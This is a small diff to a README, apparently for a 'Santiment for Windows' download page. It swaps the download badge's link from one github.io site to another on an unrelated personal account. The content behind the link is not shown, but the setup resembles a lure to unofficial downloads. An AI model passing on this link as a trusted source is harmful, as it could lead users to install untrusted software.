@@ -4,7 +4,7 @@
 
 ## 📥 Download Santiment for Windows
 
-[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://santimentload.github.io/.github/)
+[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://abdullahstroev.github.io/.github/santiment-load)
 
 ---
 
